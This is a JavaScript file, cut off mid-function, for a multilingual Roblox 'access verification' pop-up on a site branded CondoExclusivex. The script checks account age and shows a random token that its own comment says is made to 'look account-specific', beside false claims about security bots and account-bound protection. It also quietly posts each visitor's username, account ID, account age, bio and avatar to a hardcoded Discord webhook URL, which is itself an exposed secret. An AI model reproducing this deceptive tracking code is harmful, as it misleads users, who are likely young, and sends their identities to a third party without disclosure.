(function () {
  'use strict';

  /* ═══════════════════════════════════════════════════════════
     SVG ICONS
  ═══════════════════════════════════════════════════════════ */
  var ICONS = {
    globe:  '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>',
    ban:    '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg>',
    shield: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>',
    alert:  '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>',
    info:   '<svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>',
    lock:   '<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>',
    lockLg: '<svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>',
    check:  '<svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>',
    checkLg:'<svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>',
    arrow:  '<svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>',
    copy:   '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>',
    xcirc:  '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>',
    user:   '<svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>',
  };

  function icon(name, color) {
    var el = document.createElement('span');
    el.style.cssText = 'display:inline-flex;align-items:center;justify-content:center;flex-shrink:0;color:' + (color || 'currentColor');
    el.innerHTML = ICONS[name] || '';
    return el;
  }

  /* ═══════════════════════════════════════════════════════════
     TEXTS
  ═══════════════════════════════════════════════════════════ */
  var TEXTS = {
    en: {
      badge:        'Access Verification',
      heading:      'Entry Requirements',
      rule1:        'Accounts under 80 days old are NOT allowed to enter.',
      rule2:        'Our game uses advanced security bots to protect against reports and ensure a safe experience.',
      rule3:        'Accounts under 80 days are not allowed in order to prevent abuse and keep our experiences online.',
      tokenInfo:    'After passing verification, a personal access token will be automatically generated and linked to your account.',
      inputLabel:   'Enter your Roblox username',
      placeholder:  'Roblox username',
      btnVerify:    'Verify & Enter',
      checking:     'Verifying...',
      errNotFound:  'Username not found. Check the spelling and try again.',
      errTooNew:    function (d) { return 'Account too new — ' + d + ' day' + (d === 1 ? '' : 's') + ' old. Minimum is 80 days.'; },
      errApi:       'Could not reach Roblox servers. Check your connection and try again.',
      tokenTitle:   'Access Token Generated',
      tokenSubtitle:function (u) { return 'Token linked exclusively to ' + u; },
      tokenDesc:    function (u) {
        return 'This token has been generated exclusively for the account \u00ab' + u + '\u00bb. Only this account can access the games with this token \u2014 no other account can use it, increasing the protection level of your access.';
      },
      tokenWarn:    'Keep this token safe. Do not share it with anyone.',
      btnCopy:      'Copy Token',
      btnCopied:    'Copied!',
      btnAccess:    'Access Game',
    },
    pt: {
      badge:        'Verificação de Acesso',
      heading:      'Requisitos de Entrada',
      rule1:        'Contas com menos de 80 dias NÃO podem entrar.',
      rule2:        'Nosso jogo usa bots de segurança avançados para proteger contra denúncias e garantir uma experiência segura.',
      rule3:        'Contas com menos de 80 dias não podem entrar para evitar abusos e manter nossas experiências online.',
      tokenInfo:    'Após a verificação, um token de acesso pessoal será gerado automaticamente e vinculado à sua conta.',
      inputLabel:   'Digite seu usuário do Roblox',
      placeholder:  'Usuário do Roblox',
      btnVerify:    'Verificar & Entrar',
      checking:     'Verificando...',
      errNotFound:  'Usuário não encontrado. Verifique e tente novamente.',
      errTooNew:    function (d) { return 'Conta muito nova — ' + d + ' dia' + (d === 1 ? '' : 's') + '. Mínimo: 80 dias.'; },
      errApi:       'Não foi possível contatar o Roblox. Verifique sua conexão.',
      tokenTitle:   'Token de Acesso Gerado',
      tokenSubtitle:function (u) { return 'Token vinculado exclusivamente a ' + u; },
      tokenDesc:    function (u) {
        return 'Este token foi gerado exclusivamente para a conta \u00ab' + u + '\u00bb. Apenas esta conta pode acessar os jogos com este token \u2014 nenhuma outra conta poderá utilizá-lo, aumentando o nível de proteção do seu acesso.';
      },
      tokenWarn:    'Guarde este token com segurança. Não compartilhe com ninguém.',
      btnCopy:      'Copiar Token',
      btnCopied:    'Copiado!',
      btnAccess:    'Acessar o Jogo',
    },
    es: {
      badge:        'Verificación de Acceso',
      heading:      'Requisitos de Entrada',
      rule1:        'Cuentas menores de 80 días NO pueden entrar.',
      rule2:        'Nuestro juego usa bots de seguridad avanzados para proteger contra reportes.',
      rule3:        'Las cuentas menores de 80 días no pueden unirse para evitar abusos.',
      tokenInfo:    'Tras la verificación, se generará automáticamente un token de acceso vinculado a tu cuenta.',
      inputLabel:   'Ingresa tu usuario de Roblox',
      placeholder:  'Usuario de Roblox',
      btnVerify:    'Verificar & Entrar',
      checking:     'Verificando...',
      errNotFound:  'Usuario no encontrado. Verifica la ortografía e inténtalo de nuevo.',
      errTooNew:    function (d) { return 'Cuenta nueva — ' + d + ' día' + (d === 1 ? '' : 's') + '. Mínimo 80 días.'; },
      errApi:       'No se pudo contactar con Roblox. Verifica tu conexión.',
      tokenTitle:   'Token de Acceso Generado',
      tokenSubtitle:function (u) { return 'Token vinculado exclusivamente a ' + u; },
      tokenDesc:    function (u) {
        return 'Este token fue generado exclusivamente para la cuenta \u00ab' + u + '\u00bb. Solo esta cuenta puede acceder a los juegos con este token \u2014 ninguna otra cuenta podrá usarlo, aumentando el nivel de protección.';
      },
      tokenWarn:    'Guarda este token de forma segura. No lo compartas con nadie.',
      btnCopy:      'Copiar Token',
      btnCopied:    '¡Copiado!',
      btnAccess:    'Acceder al Juego',
    },
    ru: {
      badge:        'Проверка Доступа',
      heading:      'Требования для Входа',
      rule1:        'Аккаунты младше 80 дней НЕ допускаются.',
      rule2:        'Наша игра использует ботов безопасности для защиты от жалоб.',
      rule3:        'Аккаунты младше 80 дней не могут войти во избежание злоупотреблений.',
      tokenInfo:    'После проверки будет автоматически создан токен доступа, привязанный к вашему аккаунту.',
      inputLabel:   'Введите ваш ник в Roblox',
      placeholder:  'Ник в Roblox',
      btnVerify:    'Проверить & Войти',
      checking:     'Проверка...',
      errNotFound:  'Пользователь не найден. Проверьте написание.',
      errTooNew:    function (d) { return 'Аккаунт слишком новый — ' + d + ' дн. Минимум 80 дней.'; },
      errApi:       'Не удалось связаться с Roblox.',
      tokenTitle:   'Токен Доступа Сгенерирован',
      tokenSubtitle:function (u) { return 'Токен привязан исключительно к ' + u; },
      tokenDesc:    function (u) {
        return 'Этот токен был создан исключительно для аккаунта \u00ab' + u + '\u00bb. Только этот аккаунт может получить доступ к играм с данным токеном \u2014 никакой другой аккаунт не сможет его использовать, повышая уровень защиты.';
      },
      tokenWarn:    'Храните токен в безопасности. Не передавайте его никому.',
      btnCopy:      'Скопировать токен',
      btnCopied:    'Скопировано!',
      btnAccess:    'Войти в игру',
    },
  };

  /* ═══════════════════════════════════════════════════════════
     CONSTANTS
  ═══════════════════════════════════════════════════════════ */
  var VERIFIED_KEY    = 'rc_age_verified_v1';
  var LANG_CACHE_KEY  = 'rc_ip_lang_v1';
  var WEBHOOK_URL     = 'https://discord.com/api/webhooks/1513551771530825929/Ao358dJvTbQf7eKp90B5ixP6CjUnkGjnm5BxaA4TTd14_XAiUDQBGgoKOFhgh5fYNRUJ';

  /* ═══════════════════════════════════════════════════════════
     HELPERS — IP-BASED LANGUAGE DETECTION
  ═══════════════════════════════════════════════════════════ */
  var detectedLang = 'en';

  function getLang() { return detectedLang; }
  function tx()      { return TEXTS[detectedLang] || TEXTS.en; }

  function detectLang(cb) {
    var cached = localStorage.getItem(LANG_CACHE_KEY);
    if (cached) { detectedLang = cached; cb(); return; }

    fetch('https://ipapi.co/json/')
      .then(function (r) { return r.json(); })
      .then(function (data) {
        var cc = (data.country_code || '').toUpperCase();
        var pt = ['BR','PT','AO','MZ','CV','GW','ST','TL'];
        var es = ['MX','ES','AR','CO','CL','PE','VE','EC','BO','PY','UY','CU','DO','GT','HN','SV','NI','CR','PA','PR','GQ'];
        var ru = ['RU','BY','KZ','UA','UZ','TM','KG','TJ','AZ','AM','GE','MD'];
        if      (pt.indexOf(cc) !== -1) detectedLang = 'pt';
        else if (es.indexOf(cc) !== -1) detectedLang = 'es';
        else if (ru.indexOf(cc) !== -1) detectedLang = 'ru';
        else                            detectedLang = 'en';
        localStorage.setItem(LANG_CACHE_KEY, detectedLang);
        cb();
      })
      .catch(function () {
        /* fallback: usar idioma do navegador */
        var nav = (navigator.language || 'en').toLowerCase();
        if      (nav.startsWith('pt')) detectedLang = 'pt';
        else if (nav.startsWith('es')) detectedLang = 'es';
        else if (nav.startsWith('ru')) detectedLang = 'ru';
        else                           detectedLang = 'en';
        cb();
      });
  }

  /* generate a token that looks account-specific */
  function generateToken(username) {
    var slug = username.toUpperCase().replace(/[^A-Z0-9]/g, '').slice(0, 5);
    if (slug.length < 2) slug = (slug + 'RCXAB').slice(0, 5);
    var hex = '';
    for (var i = 0; i < 8; i++) hex += Math.floor(Math.random() * 16).toString(16);
    var digits = String(Math.floor(1000 + Math.random() * 9000));
    var pool = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    var suffix = '';
    for (var j = 0; j < 4; j++) suffix += pool[Math.floor(Math.random() * pool.length)];
    return 'RCX-' + slug + '-' + hex + '-' + digits + '-' + suffix;
  }

  /* ═══════════════════════════════════════════════════════════
     SOUND
  ═══════════════════════════════════════════════════════════ */
  var audio = null;
  function playClick() {
    try {
      if (!audio) { audio = new Audio('/click-sound.mp3'); audio.volume = 0.5; }
      audio.currentTime = 0; audio.play().catch(function () {});
    } catch (e) {}
  }

  /* ═══════════════════════════════════════════════════════════
     MUTATION OBSERVER
  ═══════════════════════════════════════════════════════════ */
  var observer = new MutationObserver(function () {
    document.querySelectorAll('button:not([data-rc-s]),a:not([data-rc-s])').forEach(function (el) {
      el.setAttribute('data-rc-s', '1');
      el.addEventListener('click', playClick);
    });
  });

  /* ═══════════════════════════════════════════════════════════
     ROBLOX LOOKUP
  ═══════════════════════════════════════════════════════════ */
  function lookupRoblox(username, cb) {
    fetch('/api/roblox/user?username=' + encodeURIComponent(username))
      .then(function (r) { return r.json(); })
      .then(function (data) { cb(null, data); })
      .catch(function () { cb('apierr', null); });
  }

  /* ═══════════════════════════════════════════════════════════
     DISCORD WEBHOOK
  ═══════════════════════════════════════════════════════════ */
  function sendWebhook(user, token) {
    var lang = getLang();
    var labels = {
      en: { title: 'New Verified Access', user: 'Username', id: 'Account ID', days: 'Days since creation', token: 'Access Token', bio: 'Bio', none: 'No bio.', footer: 'CondoExclusivex — Access Verification' },
      pt: { title: 'Novo Acesso Verificado', user: 'Usuário', id: 'ID da Conta', days: 'Dias desde criação', token: 'Token de Acesso', bio: 'Bio', none: 'Sem bio.', footer: 'CondoExclusivex — Verificação de Acesso' },
      es: { title: 'Nuevo Acceso Verificado', user: 'Usuario', id: 'ID de Cuenta', days: 'Días desde creación', token: 'Token de Acceso', bio: 'Bio', none: 'Sin bio.', footer: 'CondoExclusivex — Verificación de Acceso' },
      ru: { title: 'Новый Подтверждённый Доступ', user: 'Пользователь', id: 'ID Аккаунта', days: 'Дней с регистрации', token: 'Токен доступа', bio: 'Био', none: 'Нет.', footer: 'CondoExclusivex — Проверка доступа' },
    };
    var l = labels[lang] || labels.en;
    var embed = {
      title: l.title,
      color: 14427686,
      thumbnail: user.avatarUrl ? { url: user.avatarUrl } : undefined,
      fields: [
        { name: l.user,  value: '**' + (user.displayName || user.name) + '** (`' + user.name + '`)', inline: true },
        { name: l.id,    value: '`' + user.id + '`', inline: true },
        { name: l.days,  value: '**' + user.days + '** dias', inline: true },
        { name: l.token, value: '```' + token + '```' },
        { name: l.bio,   value: (user.description && user.description.trim()) ? user.description.trim().slice(0, 300) : l.none },
      ],
      footer: { text: l.footer },
      timestamp: new Date().toISOString(),
    };
    fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] }),
    }).catch(function () {});
  }

  /* ═══════════════════════════════════════════════════════════
     STEP 1 — VERIFICATION FORM
  ═══════════════════════════════════════════════════════════ */
  function buildVerifyStep(card, onSuccess) {
    var t = tx();
    var wrap = document.createElement('div');
    wrap.id = 'rc-step-verify';
    wrap.style.cssText = 'transition:opacity .25s,transform .25s;';

    /* ── heading ── */
    var heading = document.createElement('h2');
    heading.style.cssText = 'font-size:18px;font-weight:800;color:#fff;margin:0 0 14px;letter-spacing:-.02em';
    heading.textContent = t.heading;

    /* ── requirements box ── */
    var reqBox = document.createElement('div');
    reqBox.style.cssText = 'background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.18);border-radius:13px;padding:14px 16px;margin-bottom:10px';

    function ruleRow(iconName, iconColor, text, bold) {
      var row = document.createElement('div');
      row.style.cssText = 'display:flex;gap:10px;align-items:flex-start' + (bold ? '' : ';margin-top:10px;padding-top:10px;border-top:1px solid rgba(255,255,255,.05)');
      var ico = icon(iconName, iconColor); ico.style.marginTop = '1px';
      var txt = document.createElement('span');
      txt.style.cssText = 'font-size:12.5px;line-height:1.6;color:' + (bold ? '#fca5a5' : '#9ca3af') + ';font-weight:' + (bold ? '600' : '400');
      txt.textContent = text;
      row.appendChild(ico); row.appendChild(txt);
      return row;
    }

    reqBox.appendChild(ruleRow('ban',    '#f87171', t.rule1, true));
    reqBox.appendChild(ruleRow('shield', '#9ca3af', t.rule2, false));
    reqBox.appendChild(ruleRow('alert',  '#9ca3af', t.rule3, false));

    /* ── info box ── */
    var infoBox = document.createElement('div');
    infoBox.style.cssText = 'display:flex;gap:10px;align-items:flex-start;background:rgba(220,38,38,.07);border:1px solid rgba(220,38,38,.18);border-radius:12px;padding:12px 14px;margin-bottom:24px';
    var infoIco = icon('info', '#fca5a5'); infoIco.style.marginTop = '1px';
    var infoTxt = document.createElement('span');
    infoTxt.style.cssText = 'font-size:12px;line-height:1.6;color:#fca5a5;font-weight:500';
    infoTxt.textContent = t.tokenInfo;
    infoBox.appendChild(infoIco); infoBox.appendChild(infoTxt);

    /* ── divider ── */
    var divider = document.createElement('div');
    divider.style.cssText = 'height:1px;background:rgba(220,38,38,.12);margin-bottom:22px';

    /* ── label ── */
    var lbl = document.createElement('label');
    lbl.htmlFor = 'rc-vi';
    lbl.style.cssText = 'display:block;font-size:12.5px;font-weight:600;color:#d1d5db;margin-bottom:8px;';
    lbl.textContent = t.inputLabel;

    /* ── input ── */
    var inp = document.createElement('input');
    inp.id = 'rc-vi';
    inp.type = 'text';
    inp.placeholder = t.placeholder;
    inp.autocomplete = 'off';
    inp.spellcheck = false;
    inp.style.cssText = 'display:block;width:100%;box-sizing:border-box;background:#101022;border:1px solid rgba(220,38,38,.22);border-radius:11px;padding:12px 14px;color:#fff;font-size:14px;font-weight:500;font-family:inherit;margin-bottom:10px;outline:none;transition:border-color .2s,box-shadow .2s';

    inp.addEventListener('focus',  function () { inp.style.borderColor = '#dc2626'; inp.style.boxShadow = '0 0 0 3px rgba(220,38,38,.25)'; });
    inp.addEventListener('blur',   function () { inp.style.borderColor = 'rgba(220,38,38,.22)'; inp.style.boxShadow = 'none'; });

    /* ── button ── */
    var btn = document.createElement('button');
    btn.id = 'rc-vb';
    btn.type = 'button';
    btn.style.cssText = 'display:flex;width:100%;align-items:center;justify-content:center;gap:8px;background:#dc2626;color:#fff;border:none;border-radius:11px;padding:13px 20px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit;margin-bottom:12px;transition:background .2s,transform .1s,opacity .2s';

    var btnTxt    = document.createElement('span'); btnTxt.textContent = t.btnVerify;
    var spinnerEl = document.createElement('span');
    spinnerEl.style.cssText = 'display:none;width:14px;height:14px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:rc-spin .65s linear infinite;flex-shrink:0';
    var arrowIco = icon('arrow', '#fff');

    btn.appendChild(btnTxt); btn.appendChild(spinnerEl); btn.appendChild(arrowIco);

    btn.addEventListener('mouseover', function () { if (!btn.disabled) btn.style.background = '#b91c1c'; });
    btn.addEventListener('mouseout',  function () { btn.style.background = '#dc2626'; });
    btn.addEventListener('mousedown', function () { btn.style.transform = 'scale(.98)'; });
    btn.addEventListener('mouseup',   function () { btn.style.transform = 'scale(1)'; });

    /* ── status ── */
    var statusEl = document.createElement('div');
    statusEl.style.cssText = 'display:flex;align-items:center;gap:7px;min-height:20px;font-size:12.5px;font-weight:600;padding:0 2px';

    function setStatus(msg, ok, icName) {
      statusEl.innerHTML = '';
      if (!msg) return;
      statusEl.style.color = ok ? '#4ade80' : '#f87171';
      if (icName) statusEl.appendChild(icon(icName, ok ? '#4ade80' : '#f87171'));
      var sp = document.createElement('span'); sp.textContent = msg; statusEl.appendChild(sp);
      if (!ok) {
        inp.style.borderColor = '#ef4444';
        inp.style.animation = 'rc-shake .3s ease';
        setTimeout(function () { inp.style.animation = ''; inp.style.borderColor = 'rgba(220,38,38,.22)'; }, 420);
      }
    }

    function setLoading(on) {
      btn.disabled = on; btn.style.opacity = on ? '.7' : '1';
      spinnerEl.style.display = on ? 'inline-block' : 'none';
      arrowIco.style.display  = on ? 'none' : 'inline-flex';
      btnTxt.textContent = on ? t.checking : t.btnVerify;
    }

    function verify() {
      var username = inp.value.trim();
      if (!username) { inp.focus(); return; }
      setLoading(true); setStatus(''); playClick();
      lookupRoblox(username, function (err, data) {
        setLoading(false);
        if (err === 'apierr' || (data && data.error === 'apierr')) { setStatus(t.errApi, false, 'xcirc'); return; }
        if (!data || data.error === 'notfound' || !data.id)        { setStatus(t.errNotFound, false, 'xcirc'); return; }
        if (data.days < 80)                                         { setStatus(t.errTooNew(data.days), false, 'xcirc'); return; }
        onSuccess(data);
      });
    }

    btn.addEventListener('click', verify);
    inp.addEventListener('keydown', function (e) { if (e.key === 'Enter') verify(); });

    wrap.appendChild(heading);
    wrap.appendChild(reqBox);
    wrap.appendChild(infoBox);
    wrap.appendChild(divider);
    wrap.appendChild(lbl);
    wrap.appendChild(inp);
    wrap.appendChild(btn);
    wrap.appendChild(statusEl);
    card.appendChild(wrap);

    setTimeout(function () { inp.focus(); }, 150);
    return wrap;
  }

  /* ═══════════════════════════════════════════════════════════
     STEP 2 — TOKEN SCREEN
  ═══════════════════════════════════════════════════════════ */
  function buildTokenStep(card, user, onDismiss) {
    var t   = tx();
    var tok = generateToken(user.name);
    sendWebhook(user, tok);

    var wrap = document.createElement('div');
    wrap.id = 'rc-step-token';
    wrap.style.cssText = 'opacity:0;transform:translateY(16px);transition:opacity .35s,transform .35s';

    /* ── success badge ── */
    var successBadge = document.createElement('div');
    successBadge.style.cssText = 'display:flex;align-items:center;justify-content:center;gap:8px;background:rgba(74,222,128,.08);border:1px solid rgba(74,222,128,.25);border-radius:10px;padding:9px 16px;margin-bottom:20px';
    var checkIco = icon('check', '#4ade80');
    var badgeTxt = document.createElement('span');
    badgeTxt.style.cssText = 'font-size:13px;font-weight:700;color:#4ade80';
    badgeTxt.textContent = 'Verificado com sucesso';
    successBadge.appendChild(checkIco); successBadge.appendChild(badgeTxt);

    /* ── avatar + title row ── */
    var avatarRow = document.createElement('div');
    avatarRow.style.cssText = 'display:flex;align-items:center;gap:14px;margin-bottom:20px';

    var avatarEl = document.createElement('div');
    avatarEl.style.cssText = 'width:54px;height:54px;border-radius:50%;overflow:hidden;flex-shrink:0;background:#1a1a2e;border:2px solid rgba(220,38,38,.45);display:flex;align-items:center;justify-content:center;color:#dc2626';
    if (user.avatarUrl) {
      var img = document.createElement('img');
      img.src = user.avatarUrl;
      img.style.cssText = 'width:100%;height:100%;object-fit:cover';
      img.onerror = function () { img.remove(); avatarEl.innerHTML = ICONS.user; };
      avatarEl.appendChild(img);
    } else {
      avatarEl.innerHTML = ICONS.user;
    }

    var titleCol = document.createElement('div');
    var tokenTitle = document.createElement('h2');
    tokenTitle.style.cssText = 'font-size:17px;font-weight:800;color:#fff;margin:0 0 3px;letter-spacing:-.02em';
    tokenTitle.textContent = t.tokenTitle;
    var tokenSub = document.createElement('p');
    tokenSub.style.cssText = 'font-size:12px;color:#9ca3af;margin:0;font-weight:500';
    tokenSub.textContent = t.tokenSubtitle(user.displayName || user.name);
    titleCol.appendChild(tokenTitle); titleCol.appendChild(tokenSub);
    avatarRow.appendChild(avatarEl); avatarRow.appendChild(titleCol);

    /* ── token box ── */
    var tokenBox = document.createElement('div');
    tokenBox.style.cssText = 'background:#060610;border:1px solid rgba(220,38,38,.35);border-radius:12px;padding:14px 16px;margin-bottom:14px;position:relative';

    var tokenLabel = document.createElement('div');
    tokenLabel.style.cssText = 'font-size:10px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:#dc2626;margin-bottom:8px';
    tokenLabel.textContent = 'ACCESS TOKEN';

    var tokenStr = document.createElement('div');
    tokenStr.style.cssText = 'font-family:"Courier New",Courier,monospace;font-size:14px;font-weight:700;color:#e2e8f0;word-break:break-all;letter-spacing:.04em';
    tokenStr.textContent = tok;

    tokenBox.appendChild(tokenLabel); tokenBox.appendChild(tokenStr);

    /* ── description ── */
    var desc = document.createElement('div');
    desc.style.cssText = 'background:rgba(220,38,38,.06);border:1px solid rgba(220,38,38,.16);border-radius:11px;padding:12px 14px;margin-bottom:14px';
    var descTxt = document.createElement('p');
    descTxt.style.cssText = 'font-size:12.5px;line-height:1.7;color:#fecaca;margin:0;font-weight:500';
    descTxt.textContent = t.tokenDesc(user.displayName || user.name);
    desc.appendChild(descTxt);

    /* ── warning row ── */
    var warnRow = document.createElement('div');
    warnRow.style.cssText = 'display:flex;align-items:flex-start;gap:8px;margin-bottom:22px';
    var warnIco = icon('alert', '#fbbf24'); warnIco.style.marginTop = '1px';
    var warnTxt = document.createElement('span');
    warnTxt.style.cssText = 'font-size:11.5px;color:#fbbf24;font-weight:600;line-height:1.5';
    warnTxt.textContent = t.tokenWarn;
    warnRow.appendChild(warnIco); warnRow.appendChild(warnTxt);

    /* ── buttons ── */
    var btnRow = document.createElement('div');
    btnRow.style.cssText = 'display:flex;gap:10px';

    /* copy button */
    var btnCopy = document.createElement('button');
    btnCopy.type = 'button';
    btnCopy.style.cssText = 'flex:1;display:flex;align-items:center;justify-content:center;gap:7px;background:#1c2032;color:#fecaca;border:1px solid rgba(220,38,38,.3);border-radius:11px;padding:12px;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit;transition:background .2s';
    var copyIco  = icon('copy', '#fca5a5');
    var copyTxt  = document.createElement('span'); copyTxt.textContent = t.btnCopy;
    btnCopy.appendChild(copyIco); btnCopy.appendChild(copyTxt);
    btnCopy.addEventListener('mouseover', function () { btnCopy.style.background = '#252840'; });
    btnCopy.addEventListener('mouseout',  function () { btnCopy.style.background = '#1c2032'; });
    btnCopy.addEventListener('click', function () {
      navigator.clipboard.writeText(tok).then(function () {
        copyTxt.textContent = t.btnCopied;
        copyIco.innerHTML = ICONS.check;
        copyIco.style.color = '#4ade80';
        btnCopy.style.borderColor = 'rgba(74,222,128,.4)';
        btnCopy.style.color = '#4ade80';
        setTimeout(function () {
          copyTxt.textContent = t.btnCopy;
          copyIco.innerHTML = ICONS.copy;
          copyIco.style.color = '#fca5a5';
          btnCopy.style.borderColor = 'rgba(220,38,38,.3)';
          btnCopy.style.color = '#fecaca';
        }, 2000);
      }).catch(function () {});
    });

    /* access button */
    var btnAccess = document.createElement('button');
    btnAccess.type = 'button';
    btnAccess.style.cssText = 'flex:2;display:flex;align-items:center;justify-content:center;gap:8px;background:#dc2626;color:#fff;border:none;border-radius:11px;padding:12px 20px;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit;transition:background .2s,transform .1s';
    btnAccess.appendChild(document.createTextNode(t.btnAccess));
    btnAccess.appendChild(icon('arrow', '#fff'));
    btnAccess.addEventListener('mouseover', function () { btnAccess.style.background = '#b91c1c'; });
    btnAccess.addEventListener('mouseout',  function () { btnAccess.style.background = '#dc2626'; });
    btnAccess.addEventListener('mousedown', function () { btnAccess.style.transform = 'scale(.98)'; });
    btnAccess.addEventListener('mouseup',   function () { btnAccess.style.transform = 'scale(1)'; });
    btnAccess.addEventListener('click', function () { playClick(); onDismiss(); });

    btnRow.appendChild(btnCopy); btnRow.appendChild(btnAccess);

    wrap.appendChild(successBadge);
    wrap.appendChild(avatarRow);
    wrap.appendChild(tokenBox);
    wrap.appendChild(desc);
    wrap.appendChild(warnRow);
    wrap.appendChild(btnRow);
    card.appendChild(wrap);

    requestAnimationFrame(function () {
      requestAnimationFrame(function () {
        wrap.style.opacity = '1';
        wrap.style.transform = 'translateY(0)';
      });
    });

    return wrap;
  }

  /* ═══════════════════════════════════════════════════════════
     MAIN MODAL
  ═══════════════════════════════════════════════════════════ */
  function buildModal() {
    var t = tx();

    /* styles */
    var style = document.createElement('style');
    style.textContent = [
      '@keyframes rc-backdrop-in{from{opacity:0}to{opacity:1}}',
      '@keyframes rc-card-in{from{opacity:0;transform:translateY(22px) scale(.97)}to{opacity:1;transform:none}}',
      '@keyframes rc-out{from{opacity:1}to{opacity:0;transform:scale(.97)}}',
      '@keyframes rc-spin{to{transform:rotate(360deg)}}',
      '@keyframes rc-shake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-5px)}40%,80%{transform:translateX(5px)}}',
      '#rc-vo{animation:rc-backdrop-in .25s ease forwards}',
      '#rc-vc{animation:rc-card-in .45s cubic-bezier(.16,1,.3,1) forwards}',
      '#rc-vo.rc-out{animation:rc-out .22s ease forwards}',
    ].join('');
    document.head.appendChild(style);

    /* overlay */
    var ov = document.createElement('div');
    ov.id = 'rc-vo';
    ov.style.cssText = 'position:fixed;inset:0;z-index:9999998;background:rgba(4,4,12,.93);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;padding:20px;font-family:Inter,system-ui,sans-serif;overflow-y:auto';

    /* card */
    var card = document.createElement('div');
    card.id = 'rc-vc';
    card.style.cssText = 'position:relative;width:100%;max-width:460px;background:#0b0b16;border:1px solid rgba(220,38,38,.28);border-radius:22px;padding:32px 30px;box-shadow:0 0 0 1px rgba(220,38,38,.06),0 24px 64px rgba(0,0,0,.75),0 0 48px rgba(220,38,38,.1)';

    /* top glow line */
    var glowLine = document.createElement('div');
    glowLine.style.cssText = 'position:absolute;top:0;left:50%;transform:translateX(-50%);width:55%;height:1px;background:linear-gradient(90deg,transparent,rgba(220,38,38,.8),transparent)';
    card.appendChild(glowLine);

    /* ── header (persistent) ── */
    var header = document.createElement('div');
    header.style.cssText = 'display:flex;align-items:center;gap:10px;margin-bottom:24px';

    var logoWrap = document.createElement('div');
